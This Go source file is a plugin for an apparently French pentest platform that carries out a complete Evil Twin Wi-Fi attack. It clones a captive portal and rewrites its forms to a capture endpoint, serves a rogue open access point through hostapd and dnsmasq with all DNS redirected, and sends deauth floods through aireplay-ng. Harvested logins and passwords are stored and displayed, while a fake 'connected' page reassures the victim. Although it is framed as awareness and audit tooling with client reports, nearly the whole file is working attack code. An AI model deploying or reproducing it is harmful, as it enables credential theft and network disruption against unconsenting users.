package eviltwin

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/gobuffalo/buffalo"
	"github.com/nxo/engine/internal/plugins"
	"github.com/nxo/engine/internal/ui"
)

func writeJSON(c buffalo.Context, status int, payload any) error {
	c.Response().Header().Set("Content-Type", "application/json; charset=utf-8")
	c.Response().WriteHeader(status)
	_ = json.NewEncoder(c.Response()).Encode(payload)
	return nil
}

var _ plugins.Plugin = (*EvilTwinPlugin)(nil)

type EvilTwinPlugin struct{}

// CapturedCredential represents a captured login attempt
type CapturedCredential struct {
	Timestamp time.Time `json:"timestamp"`
	SourceIP  string    `json:"source_ip"`
	SourceMAC string    `json:"source_mac,omitempty"`
	Login     string    `json:"login"`
	Password  string    `json:"password"`
	UserAgent string    `json:"user_agent"`
	ExtraData string    `json:"extra_data,omitempty"`
}

// EvilTwinState holds the current state of the attack
type EvilTwinState struct {
	mu               sync.Mutex
	Running          bool                 `json:"running"`
	Phase            string               `json:"phase"` // idle, cloning, deauth, serving
	TargetSSID       string               `json:"target_ssid"`
	TargetBSSID      string               `json:"target_bssid"`
	TargetChannel    int                  `json:"target_channel"`
	FakeSSID         string               `json:"fake_ssid"`
	Interface        string               `json:"interface"`
	MonitorIface     string               `json:"monitor_iface"`
	ClonedPortalDir  string               `json:"cloned_portal_dir"`
	StartedAt        time.Time            `json:"started_at"`
	Credentials      []CapturedCredential `json:"credentials"`
	ConnectedClients int                  `json:"connected_clients"`
	DeauthSent       int                  `json:"deauth_sent"`
	Error            string               `json:"error,omitempty"`

	// Process handles
	hostapdCmd   *exec.Cmd
	dnsmasqCmd   *exec.Cmd
	webServerCmd *exec.Cmd
	deauthCmd    *exec.Cmd
	cancelChan   chan struct{}
}

var state = &EvilTwinState{
	Credentials: []CapturedCredential{},
}

func init() {
	plugins.Register(&EvilTwinPlugin{})
}

func (p *EvilTwinPlugin) Key() string     { return "eviltwin" }
func (p *EvilTwinPlugin) Version() string { return "1.0.0" }
func (p *EvilTwinPlugin) Description() string {
	return "Attaque Evil Twin - Clone de portail captif pour sensibilisation"
}

func (p *EvilTwinPlugin) Manifest() map[string]any {
	return map[string]any{
		"menu_items": []map[string]any{
			{"label": "Evil Twin", "icon": "radio", "route": "/admin/plugins/eviltwin"},
		},
		"permissions": []string{"eviltwin:start", "eviltwin:stop", "eviltwin:clone"},
	}
}

func (p *EvilTwinPlugin) RegisterRoutes(app *buffalo.App, deps plugins.Deps) {
	// app is already the group /api/v1/plugins/eviltwin from mount.go
	app.GET("/view", p.View)
	app.POST("/clone", p.ClonePortal)
	app.POST("/start", p.StartAttack)
	app.POST("/stop", p.StopAttack)
	app.GET("/status", p.GetStatus)
	app.GET("/credentials", p.GetCredentials)
	app.POST("/deauth", p.SendDeauth)
	app.POST("/report/generate", p.GenerateReport)
	app.GET("/interfaces", p.GetInterfaces)

	// Endpoint pour capturer les credentials (appelé par le portail cloné)
	app.POST("/capture", p.CaptureCredentials)
}

func (p *EvilTwinPlugin) View(c buffalo.Context) error {
	view := ui.NewView("Evil Twin Attack").WithIcon("radio").WithRefresh(3)

	// Get WiFi interfaces
	interfaces := getWiFiInterfaces()
	ifaceOptions := []ui.SelectOption{{Label: "Sélectionner...", Value: ""}}
	for _, iface := range interfaces {
		ifaceOptions = append(ifaceOptions, ui.SelectOption{
			Label: fmt.Sprintf("%s (%s)", iface.Name, iface.Mode),
			Value: iface.Name,
		})
	}

	// === SECTION 1: Statut de l'attaque ===
	state.mu.Lock()
	running := state.Running
	phase := state.Phase
	targetSSID := state.TargetSSID
	connectedClients := state.ConnectedClients
	deauthSent := state.DeauthSent
	credsCount := len(state.Credentials)
	state.mu.Unlock()

	if running {
		statusData := []map[string]any{{
			"phase":    phase,
			"target":   targetSSID,
			"clients":  connectedClients,
			"deauth":   deauthSent,
			"captured": credsCount,
		}}
		statusCols := []ui.TableColumn{
			{Key: "phase", Label: "Phase", Render: "badge"},
			{Key: "target", Label: "Cible"},
			{Key: "clients", Label: "Clients connectés"},
			{Key: "deauth", Label: "Deauth envoyés"},
			{Key: "captured", Label: "Credentials capturés"},
		}
		view.AddComponent(ui.Card("⚠️ Attaque en cours",
			ui.Table(statusCols, statusData),
		))
	}

	// === SECTION 2: Configuration de l'attaque ===
	configFields := []ui.FormField{
		{Name: "interface", Label: "Interface WiFi", Type: "select", Required: true, Options: ifaceOptions, Help: "Interface capable de mode AP (ex: wlan0)"},
		{Name: "target_ssid", Label: "SSID cible", Type: "text", Required: true, Placeholder: "Hotel_WiFi"},
		{Name: "target_bssid", Label: "BSSID cible (optionnel)", Type: "text", Placeholder: "AA:BB:CC:DD:EE:FF"},
		{Name: "target_channel", Label: "Canal", Type: "number", Default: 6},
		{Name: "fake_ssid", Label: "SSID du faux AP", Type: "text", Help: "Laisser vide pour utiliser le même que la cible"},
		{Name: "portal_url", Label: "URL du portail à cloner", Type: "text", Placeholder: "http://192.168.1.1/login"},
		{Name: "auto_deauth", Label: "Deauth automatique", Type: "checkbox", Default: true, Help: "Désauthentifier les clients du vrai réseau"},
		{Name: "deauth_interval", Label: "Intervalle deauth (sec)", Type: "number", Default: 5},
	}

	if !running {
		view.AddComponent(ui.Card("1. Configuration de l'attaque",
			ui.Form("eviltwin-config", configFields,
				ui.WithSubmitURL("/api/v1/plugins/eviltwin/start", "POST"),
				ui.WithSubmitLabel("🚀 Lancer l'attaque"),
			),
		))
	} else {
		stopFields := []ui.FormField{}
		view.AddComponent(ui.Card("Contrôle",
			ui.Form("eviltwin-stop", stopFields,
				ui.WithSubmitURL("/api/v1/plugins/eviltwin/stop", "POST"),
				ui.WithSubmitLabel("⏹️ Arrêter l'attaque"),
			),
		))
	}

	// === SECTION 3: Credentials capturés ===
	state.mu.Lock()
	creds := make([]map[string]any, len(state.Credentials))
	for i, cred := range state.Credentials {
		creds[i] = map[string]any{
			"timestamp":  cred.Timestamp,
			"source_ip":  cred.SourceIP,
			"login":      cred.Login,
			"password":   cred.Password,
			"user_agent": cred.UserAgent,
		}
	}
	state.mu.Unlock()

	credsCols := []ui.TableColumn{
		{Key: "timestamp", Label: "Date", Render: "datetime"},
		{Key: "source_ip", Label: "IP Source"},
		{Key: "login", Label: "Login"},
		{Key: "password", Label: "Mot de passe"},
		{Key: "user_agent", Label: "User-Agent"},
	}
	view.AddComponent(ui.Card("2. Credentials capturés",
		ui.Table(credsCols, creds),
	))

	// === SECTION 4: Génération de rapport ===
	reportFields := []ui.FormField{
		{Name: "client_name", Label: "Nom du client", Type: "text", Required: true},
		{Name: "tester_name", Label: "Nom du testeur", Type: "text"},
		{Name: "objective", Label: "Objectif", Type: "select", Options: []ui.SelectOption{
			{Label: "Sensibilisation", Value: "awareness"},
			{Label: "Audit de sécurité", Value: "audit"},
			{Label: "Test de pénétration", Value: "pentest"},
		}},
	}
	view.AddComponent(ui.Card("3. Générer un rapport",
		ui.Form("eviltwin-report", reportFields,
			ui.WithSubmitURL("/api/v1/plugins/eviltwin/report/generate", "POST"),
			ui.WithSubmitLabel("📄 Générer le rapport"),
		),
	))

	// === SECTION 5: Informations sur le matériel ===
	hardwareInfo := `
### Matériel requis

**Option 1 - Configuration minimale :**
- 1x Adaptateur WiFi compatible mode AP + mode monitor (ex: Alfa AWUS036ACH, TP-Link Archer T3U Plus)
- Permet de créer le faux AP ET de scanner/deauth

**Option 2 - Configuration optimale :**
- 2x Adaptateurs WiFi :
  - 1 pour le faux AP (mode AP)
  - 1 pour le deauth (mode monitor)
- Permet attaque simultanée sans interruption

**Smartphone en partage de connexion ?**
❌ **Non suffisant** pour créer un faux AP WiFi.
✅ Peut servir pour l'accès internet du faux AP (via USB tethering)

**Routeur nécessaire ?**
❌ Non, un adaptateur WiFi USB avec mode AP suffit
✅ Un routeur portable type GL.iNet peut être pratique pour des attaques prolongées
`
	view.AddComponent(ui.Card("ℹ️ Matériel requis",
		ui.Text(hardwareInfo),
	))

	return writeJSON(c, 200, view)
}

// WiFiInterface represents a WiFi interface
type WiFiInterface struct {
	Name    string `json:"name"`
	Mode    string `json:"mode"`
	Channel int    `json:"channel"`
	MAC     string `json:"mac"`
}

func getWiFiInterfaces() []WiFiInterface {
	interfaces := []WiFiInterface{}

	// List wireless interfaces
	out, err := exec.Command("iw", "dev").Output()
	if err != nil {
		return interfaces
	}

	lines := strings.Split(string(out), "\n")
	var current WiFiInterface
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, "Interface ") {
			if current.Name != "" {
				interfaces = append(interfaces, current)
			}
			current = WiFiInterface{Name: strings.TrimPrefix(line, "Interface ")}
		} else if strings.HasPrefix(line, "type ") {
			current.Mode = strings.TrimPrefix(line, "type ")
		} else if strings.HasPrefix(line, "channel ") {
			fmt.Sscanf(line, "channel %d", &current.Channel)
		} else if strings.HasPrefix(line, "addr ") {
			current.MAC = strings.TrimPrefix(line, "addr ")
		}
	}
	if current.Name != "" {
		interfaces = append(interfaces, current)
	}

	return interfaces
}

func (p *EvilTwinPlugin) GetInterfaces(c buffalo.Context) error {
	return writeJSON(c, 200, map[string]any{"interfaces": getWiFiInterfaces()})
}

// ClonePortal downloads and modifies a captive portal page
func (p *EvilTwinPlugin) ClonePortal(c buffalo.Context) error {
	portalURL := c.Request().FormValue("portal_url")
	if portalURL == "" {
		return writeJSON(c, 400, map[string]any{"error": "URL du portail requise"})
	}

	// Create clone directory
	cloneDir := fmt.Sprintf("/opt/heimdall/eviltwin/portals/%d", time.Now().Unix())
	if err := os.MkdirAll(cloneDir, 0755); err != nil {
		return writeJSON(c, 500, map[string]any{"error": fmt.Sprintf("Impossible de créer le répertoire: %v", err)})
	}

	// Download the portal page
	resp, err := http.Get(portalURL)
	if err != nil {
		return writeJSON(c, 500, map[string]any{"error": fmt.Sprintf("Impossible de télécharger: %v", err)})
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return writeJSON(c, 500, map[string]any{"error": fmt.Sprintf("Erreur de lecture: %v", err)})
	}

	html := string(body)

	// Modify form action to point to our capture endpoint
	formActionRe := regexp.MustCompile(`(<form[^>]*action=["'])([^"']*)(['"])`)
	html = formActionRe.ReplaceAllString(html, `${1}/capture${3}`)

	// Also handle forms without action (default to current page)
	formNoActionRe := regexp.MustCompile(`(<form)([^>]*>)`)
	html = formNoActionRe.ReplaceAllStringFunc(html, func(match string) string {
		if !strings.Contains(match, "action=") {
			return strings.Replace(match, "<form", `<form action="/capture"`, 1)
		}
		return match
	})

	// Ensure method is POST
	methodRe := regexp.MustCompile(`method=["']get["']`)
	html = methodRe.ReplaceAllString(html, `method="post"`)

	// Add hidden field for tracking
	hiddenField := `<input type="hidden" name="_eviltwin_timestamp" value="` + fmt.Sprintf("%d", time.Now().Unix()) + `">`
	html = strings.Replace(html, "</form>", hiddenField+"</form>", -1)

	// Save modified HTML
	indexPath := filepath.Join(cloneDir, "index.html")
	if err := ioutil.WriteFile(indexPath, []byte(html), 0644); err != nil {
		return writeJSON(c, 500, map[string]any{"error": fmt.Sprintf("Erreur d'écriture: %v", err)})
	}

	// Try to download CSS/JS resources (basic implementation)
	// TODO: Implement recursive resource downloading

	state.mu.Lock()
	state.ClonedPortalDir = cloneDir
	state.mu.Unlock()

	return writeJSON(c, 200, map[string]any{
		"message": "Portail cloné avec succès",
		"path":    cloneDir,
	})
}

// StartAttack starts the Evil Twin attack
func (p *EvilTwinPlugin) StartAttack(c buffalo.Context) error {
	state.mu.Lock()
	if state.Running {
		state.mu.Unlock()
		return writeJSON(c, 409, map[string]any{"error": "Une attaque est déjà en cours"})
	}
	state.mu.Unlock()

	iface := c.Request().FormValue("interface")
	targetSSID := c.Request().FormValue("target_ssid")
	targetBSSID := c.Request().FormValue("target_bssid")
	targetChannel := 6
	fmt.Sscanf(c.Request().FormValue("target_channel"), "%d", &targetChannel)
	fakeSSID := c.Request().FormValue("fake_ssid")
	portalURL := c.Request().FormValue("portal_url")
	autoDeauth := c.Request().FormValue("auto_deauth") == "on" || c.Request().FormValue("auto_deauth") == "true"
	deauthInterval := 5
	fmt.Sscanf(c.Request().FormValue("deauth_interval"), "%d", &deauthInterval)

	if iface == "" || targetSSID == "" {
		return writeJSON(c, 400, map[string]any{"error": "Interface et SSID requis"})
	}

	if fakeSSID == "" {
		fakeSSID = targetSSID
	}

	// Clone portal if URL provided and not already cloned
	if portalURL != "" {
		state.mu.Lock()
		if state.ClonedPortalDir == "" {
			state.mu.Unlock()
			// Clone the portal first
			resp, err := http.Get(portalURL)
			if err == nil {
				resp.Body.Close()
				// Trigger clone
				c.Request().Form.Set("portal_url", portalURL)
				p.ClonePortal(c)
			}
		} else {
			state.mu.Unlock()
		}
	}

	// Initialize state
	state.mu.Lock()
	state.Running = true
	state.Phase = "initializing"
	state.TargetSSID = targetSSID
	state.TargetBSSID = targetBSSID
	state.TargetChannel = targetChannel
	state.FakeSSID = fakeSSID
	state.Interface = iface
	state.StartedAt = time.Now()
	state.Credentials = []CapturedCredential{}
	state.ConnectedClients = 0
	state.DeauthSent = 0
	state.Error = ""
	state.cancelChan = make(chan struct{})
	state.mu.Unlock()

	// Start the attack in background
	go runEvilTwinAttack(iface, targetSSID, targetBSSID, targetChannel, fakeSSID, autoDeauth, deauthInterval)

	return writeJSON(c, 200, map[string]any{
		"message": "Attaque Evil Twin démarrée",
		"config": map[string]any{
			"interface":      iface,
			"target_ssid":    targetSSID,
			"fake_ssid":      fakeSSID,
			"target_channel": targetChannel,
			"auto_deauth":    autoDeauth,
		},
	})
}

func runEvilTwinAttack(iface, targetSSID, targetBSSID string, channel int, fakeSSID string, autoDeauth bool, deauthInterval int) {
	defer func() {
		state.mu.Lock()
		state.Running = false
		state.Phase = "stopped"
		state.mu.Unlock()
	}()

	// Step 1: Put interface in AP mode
	state.mu.Lock()
	state.Phase = "configuring_interface"
	state.mu.Unlock()

	// Stop NetworkManager control of interface
	exec.Command("nmcli", "device", "set", iface, "managed", "no").Run()

	// Set channel
	exec.Command("ip", "link", "set", iface, "down").Run()
	exec.Command("iwconfig", iface, "channel", fmt.Sprintf("%d", channel)).Run()
	exec.Command("ip", "link", "set", iface, "up").Run()

	// Step 2: Create hostapd config
	state.mu.Lock()
	state.Phase = "starting_ap"
	state.mu.Unlock()

	hostapdConf := fmt.Sprintf(`
interface=%s
driver=nl80211
ssid=%s
hw_mode=g
channel=%d
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=0
`, iface, fakeSSID, channel)

	confPath := "/tmp/eviltwin_hostapd.conf"
	ioutil.WriteFile(confPath, []byte(hostapdConf), 0644)

	// Start hostapd
	state.mu.Lock()
	state.hostapdCmd = exec.Command("hostapd", confPath)
	state.mu.Unlock()

	if err := state.hostapdCmd.Start(); err != nil {
		state.mu.Lock()
		state.Error = fmt.Sprintf("Erreur hostapd: %v", err)
		state.mu.Unlock()
		return
	}

	// Step 3: Configure IP and DHCP
	state.mu.Lock()
	state.Phase = "configuring_network"
	state.mu.Unlock()

	exec.Command("ip", "addr", "add", "10.0.0.1/24", "dev", iface).Run()
	exec.Command("ip", "link", "set", iface, "up").Run()

	// Create dnsmasq config
	dnsmasqConf := fmt.Sprintf(`
interface=%s
dhcp-range=10.0.0.10,10.0.0.100,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
address=/#/10.0.0.1
`, iface)

	dnsmasqPath := "/tmp/eviltwin_dnsmasq.conf"
	ioutil.WriteFile(dnsmasqPath, []byte(dnsmasqConf), 0644)

	// Start dnsmasq
	state.mu.Lock()
	state.dnsmasqCmd = exec.Command("dnsmasq", "-C", dnsmasqPath, "-d")
	state.mu.Unlock()
	state.dnsmasqCmd.Start()

	// Step 4: Start web server with cloned portal
	state.mu.Lock()
	state.Phase = "starting_webserver"
	portalDir := state.ClonedPortalDir
	state.mu.Unlock()

	if portalDir == "" {
		// Create default portal
		portalDir = "/opt/heimdall/eviltwin/default_portal"
		os.MkdirAll(portalDir, 0755)
		defaultHTML := getDefaultPortalHTML(fakeSSID)
		ioutil.WriteFile(filepath.Join(portalDir, "index.html"), []byte(defaultHTML), 0644)
	}

	// Start simple HTTP server
	go startCaptivePortalServer(portalDir)

	// Step 5: Start deauth if enabled
	if autoDeauth && targetBSSID != "" {
		state.mu.Lock()
		state.Phase = "deauthing"
		state.mu.Unlock()

		go runDeauthLoop(iface, targetBSSID, deauthInterval)
	}

	state.mu.Lock()
	state.Phase = "running"
	state.mu.Unlock()

	// Wait for stop signal
	<-state.cancelChan
}

func runDeauthLoop(iface, targetBSSID string, interval int) {
	// Need a separate monitor interface for deauth
	monIface := iface + "mon"

	// Try to create monitor interface
	exec.Command("airmon-ng", "start", iface).Run()

	ticker := time.NewTicker(time.Duration(interval) * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-state.cancelChan:
			return
		case <-ticker.C:
			// Send deauth packets
			cmd := exec.Command("aireplay-ng", "--deauth", "5", "-a", targetBSSID, monIface)
			if err := cmd.Run(); err == nil {
				state.mu.Lock()
				state.DeauthSent += 5
				state.mu.Unlock()
			}
		}
	}
}

func startCaptivePortalServer(portalDir string) {
	mux := http.NewServeMux()

	// Serve static files
	mux.Handle("/", http.FileServer(http.Dir(portalDir)))

	// Capture endpoint
	mux.HandleFunc("/capture", func(w http.ResponseWriter, r *http.Request) {
		if r.Method == "POST" {
			r.ParseForm()

			// Extract credentials
			login := r.FormValue("login")
			if login == "" {
				login = r.FormValue("username")
			}
			if login == "" {
				login = r.FormValue("email")
			}
			if login == "" {
				login = r.FormValue("code")
			}

			password := r.FormValue("password")
			if password == "" {
				password = r.FormValue("pass")
			}
			if password == "" {
				password = r.FormValue("pwd")
			}

			// Get source IP
			sourceIP := r.RemoteAddr
			if ip, _, err := net.SplitHostPort(r.RemoteAddr); err == nil {
				sourceIP = ip
			}

			cred := CapturedCredential{
				Timestamp: time.Now(),
				SourceIP:  sourceIP,
				Login:     login,
				Password:  password,
				UserAgent: r.UserAgent(),
			}

			state.mu.Lock()
			state.Credentials = append(state.Credentials, cred)
			state.mu.Unlock()

			// Show success page
			w.Header().Set("Content-Type", "text/html")
			w.Write([]byte(getSuccessHTML()))
		}
	})

	// Start server on port 80
	http.ListenAndServe("10.0.0.1:80", mux)
}

func getDefaultPortalHTML(ssid string) string {
	return fmt.Sprintf(`<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>%s - Connexion WiFi</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: linear-gradient(135deg, #667eea 0%%, #764ba2 100%%); min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .container { background: white; padding: 40px; border-radius: 10px; box-shadow: 0 10px 40px rgba(0,0,0,0.2); width: 100%%; max-width: 400px; }
        h1 { color: #333; margin-bottom: 10px; font-size: 24px; }
        p { color: #666; margin-bottom: 30px; }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 5px; color: #333; font-weight: 500; }
        input { width: 100%%; padding: 12px; border: 1px solid #ddd; border-radius: 5px; font-size: 16px; }
        input:focus { outline: none; border-color: #667eea; }
        button { width: 100%%; padding: 14px; background: linear-gradient(135deg, #667eea 0%%, #764ba2 100%%); color: white; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; font-weight: 600; }
        button:hover { opacity: 0.9; }
        .logo { text-align: center; margin-bottom: 20px; font-size: 40px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">📶</div>
        <h1>Bienvenue sur %s</h1>
        <p>Veuillez vous authentifier pour accéder à Internet.</p>
        <form action="/capture" method="POST">
            <div class="form-group">
                <label>Email ou N° de chambre</label>
                <input type="text" name="login" required placeholder="votre.email@example.com">
            </div>
            <div class="form-group">
                <label>Mot de passe / Code d'accès</label>
                <input type="password" name="password" required placeholder="••••••••">
            </div>
            <button type="submit">Se connecter</button>
        </form>
    </div>
</body>
</html>`, ssid, ssid)
}

func getSuccessHTML() string {
	return `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Connexion réussie</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f0f0f0; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .container { background: white; padding: 40px; border-radius: 10px; text-align: center; box-shadow: 0 10px 40px rgba(0,0,0,0.1); }
        .icon { font-size: 60px; margin-bottom: 20px; }
        h1 { color: #333; margin-bottom: 10px; }
        p { color: #666; }
    </style>
</head>
<body>
    <div class="container">
        <div class="icon">✅</div>
        <h1>Connexion établie</h1>
        <p>Vous êtes maintenant connecté à Internet.</p>
        <p style="margin-top: 20px; font-size: 12px; color: #999;">Vous serez redirigé automatiquement...</p>
    </div>
    <script>setTimeout(function(){ window.location.href = 'http://www.google.com'; }, 3000);</script>
</body>
</html>`
}

// StopAttack stops the Evil Twin attack
func (p *EvilTwinPlugin) StopAttack(c buffalo.Context) error {
	state.mu.Lock()
	if !state.Running {
		state.mu.Unlock()
		return writeJSON(c, 400, map[string]any{"error": "Aucune attaque en cours"})
	}

	// Signal stop
	if state.cancelChan != nil {
		close(state.cancelChan)
	}

	// Kill processes
	if state.hostapdCmd != nil && state.hostapdCmd.Process != nil {
		state.hostapdCmd.Process.Kill()
	}
	if state.dnsmasqCmd != nil && state.dnsmasqCmd.Process != nil {
		state.dnsmasqCmd.Process.Kill()
	}
	if state.deauthCmd != nil && state.deauthCmd.Process != nil {
		state.deauthCmd.Process.Kill()
	}

	iface := state.Interface
	state.Running = false
	state.Phase = "stopped"
	state.mu.Unlock()

	// Cleanup
	exec.Command("ip", "addr", "del", "10.0.0.1/24", "dev", iface).Run()
	exec.Command("nmcli", "device", "set", iface, "managed", "yes").Run()
	exec.Command("pkill", "-f", "eviltwin_hostapd").Run()
	exec.Command("pkill", "-f", "eviltwin_dnsmasq").Run()

	return writeJSON(c, 200, map[string]any{"message": "Attaque arrêtée"})
}

func (p *EvilTwinPlugin) GetStatus(c buffalo.Context) error {
	state.mu.Lock()
	defer state.mu.Unlock()

	return writeJSON(c, 200, map[string]any{
		"running":           state.Running,
		"phase":             state.Phase,
		"target_ssid":       state.TargetSSID,
		"fake_ssid":         state.FakeSSID,
		"connected_clients": state.ConnectedClients,
		"deauth_sent":       state.DeauthSent,
		"credentials_count": len(state.Credentials),
		"started_at":        state.StartedAt,
		"error":             state.Error,
	})
}

func (p *EvilTwinPlugin) GetCredentials(c buffalo.Context) error {
	state.mu.Lock()
	creds := append([]CapturedCredential{}, state.Credentials...)
	state.mu.Unlock()

	return writeJSON(c, 200, map[string]any{"credentials": creds})
}

func (p *EvilTwinPlugin) SendDeauth(c buffalo.Context) error {
	targetBSSID := c.Request().FormValue("target_bssid")
	count := 10
	fmt.Sscanf(c.Request().FormValue("count"), "%d", &count)

	state.mu.Lock()
	iface := state.Interface
	state.mu.Unlock()

	if iface == "" {
		return writeJSON(c, 400, map[string]any{"error": "Aucune interface configurée"})
	}

	cmd := exec.Command("aireplay-ng", "--deauth", fmt.Sprintf("%d", count), "-a", targetBSSID, iface+"mon")
	if err := cmd.Run(); err != nil {
		return writeJSON(c, 500, map[string]any{"error": fmt.Sprintf("Erreur deauth: %v", err)})
	}

	state.mu.Lock()
	state.DeauthSent += count
	state.mu.Unlock()

	return writeJSON(c, 200, map[string]any{"message": fmt.Sprintf("%d paquets deauth envoyés", count)})
}

func (p *EvilTwinPlugin) CaptureCredentials(c buffalo.Context) error {
	var cred CapturedCredential
	if err := json.NewDecoder(c.Request().Body).Decode(&cred); err != nil {
		// Try form data
		cred = CapturedCredential{
			Timestamp: time.Now(),
			SourceIP:  c.Request().RemoteAddr,
			Login:     c.Request().FormValue("login"),
			Password:  c.Request().FormValue("password"),
			UserAgent: c.Request().UserAgent(),
		}
	}

	cred.Timestamp = time.Now()
	if cred.SourceIP == "" {
		cred.SourceIP = c.Request().RemoteAddr
	}

	state.mu.Lock()
	state.Credentials = append(state.Credentials, cred)
	state.mu.Unlock()

	return writeJSON(c, 200, map[string]any{"message": "Credential captured"})
}

func (p *EvilTwinPlugin) GenerateReport(c buffalo.Context) error {
	clientName := c.Request().FormValue("client_name")
	testerName := c.Request().FormValue("tester_name")
	objective := c.Request().FormValue("objective")

	if clientName == "" {
		return writeJSON(c, 400, map[string]any{"error": "Nom du client requis"})
	}

	state.mu.Lock()
	creds := append([]CapturedCredential{}, state.Credentials...)
	targetSSID := state.TargetSSID
	fakeSSID := state.FakeSSID
	startedAt := state.StartedAt
	deauthSent := state.DeauthSent
	state.mu.Unlock()

	report := EvilTwinReport{
		ClientName:  clientName,
		TesterName:  testerName,
		Objective:   objective,
		TargetSSID:  targetSSID,
		FakeSSID:    fakeSSID,
		StartedAt:   startedAt,
		EndedAt:     time.Now(),
		Credentials: creds,
		DeauthSent:  deauthSent,
	}

	path, err := GenerateEvilTwinReport(report)
	if err != nil {
		return writeJSON(c, 500, map[string]any{"error": err.Error()})
	}

	return writeJSON(c, 200, map[string]any{
		"message": "Rapport généré",
		"path":    path,
	})
}
